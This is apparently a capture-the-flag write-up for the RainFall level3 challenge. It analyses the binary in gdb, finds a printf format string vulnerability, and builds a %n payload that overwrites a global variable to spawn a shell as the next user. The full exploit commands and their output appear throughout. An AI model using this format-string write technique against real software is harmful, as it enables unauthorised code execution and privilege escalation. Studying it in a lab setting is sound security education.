# Walkthrough

While examining the files in my home directory, I came across a binary file named "level3". Upon executing it, I observed that it reads data from the standard input and outputs it to the console.

```sh
level3@RainFall:~$ ./level3
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

Curious about its functionality, I attempted to analyze the binary and discovered that the main function calls a v() function.

```c
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
```

This function uses the fgets() function to read data from the input, and then prints the contents of the buffer using printf().

```c
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.
```

Following this, the program checks whether the value stored at memory address `0x804988c` is equal to 64. If the condition is true, the program prints a message to the console using the fwrite() function `("Wait what?!\n")` and starts a new shell process `(/bin/sh)` within the current process. However, if the condition is false, the program does not take any further action.

```c
(gdb) x/s 0x8048600
0x8048600:  "Wait what?!\n"
(gdb) x/s 0x804860d
0x804860d:  "/bin/sh"
```

To execute a new shell process in the level3 program, we need to modify the value of the memory address 0x804988c to 64.

```c
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
```

However, the program is not vulnerable to the gets function because it uses the safer fgets function with a specified size. Therefore, we need to find another vulnerability in the program. After conducting some research, I discovered a format string vulnerability in the printf() function. With this vulnerability, I can provide a format string that contains conversion specifications that allow me to reference memory locations that I am not authorized to access. By using certain conversion specifications like %x, %p, or %n, I can read or write data from arbitrary memory locations. You can find more information about these conversion specifications in the `manual of printf`. 

In the program, I attempted to use the x conversion specifier to print the values in hexadecimal format. The resulting output was as follows:
```c
level3@RainFall:~$ ./level3
AAAA %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```

In this example, the printf function printed a memory address followed by the value 41414141, which represents the ASCII characters "AAAA". This value was passed in the beginning of the string. Based on this observation, I decided to pass the memory address `0x804988c` instead of the `AAAA` string to see if the output would include the inputted address:

To accomplish this, I utilized Python to generate the required string:

```sh
level3@RainFall:~$ python2 -c 'print("\x08\x04\x98\x8c"[::-1] + "%x " * 4)' > /tmp/flag
level3@RainFall:~$ cat /tmp/flag
�%x %x %x %x
level3@RainFall:~$ cat /tmp/flag | ./level3
�200 b7fd1ac0 b7ff37d0 804988c
level3@RainFall:~$
```

As we know, the `%n` conversion specifier can modify the value of the memory address passed to it. Therefore, I decided to replace the last %x conversion specifier with %n in the printf function call.

before using the `%n` conversion:
```sh
(gdb) ni
=> 0x80484df <v+59>:	cmp    eax,0x40
eax            0x0	0
```

after using the `%n` conversion:
```
level3@RainFall:~$ python2 -c 'print("\x08\x04\x98\x8c"[::-1] + "%x " * 3 + "%n")' > /tmp/flag
level3@RainFall:~$ cat /tmp/flag
�%x %x %x %n
level3@RainFall:~$ cat /tmp/flag | ./level3
�200 b7fd1ac0 b7ff37d0
                ------------------------------------
(gdb) ni
=> 0x80484df <v+59>:	cmp    eax,0x40    
eax            0x1a	26
```

Based on the example above, we can make the following assumption:
```
|�|200 |b7fd1ac0 |b7ff37d0 |
|4|  4 |     9   |    9    | // result = 26
```

After analyzing the situation, we have determined that we need an additional 38 bytes because 64 - 26 = 38. To add these bytes using the concept of width in printf, we can use the number 38 after the percentage sign, which tells printf to add 38 characters. However, the issue with using width is that it calculates the length of the value being printed, subtracts it from the width, and then pads the result with spaces. To compensate for this, we will add 8 to the 38 characters `(46)`to make the total length equal to 64.
```sh
level3@RainFall:~$ python2 -c 'print("\x08\x04\x98\x8c"[::-1] + "%x " * 2 + "%46x " + "%n")' > /tmp/flag
level3@RainFall:~$ cat /tmp/flag
�%x %x %46x %n
```

And by performing this operation, we can use the generated payload to attempt to exploit the level3 binary:

```
level3@RainFall:~$ cat /tmp/flag - | ./level3
�200 b7fd1ac0                                       b7ff37d0
Wait what?!
whoami
level4
cd ../level4
ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
```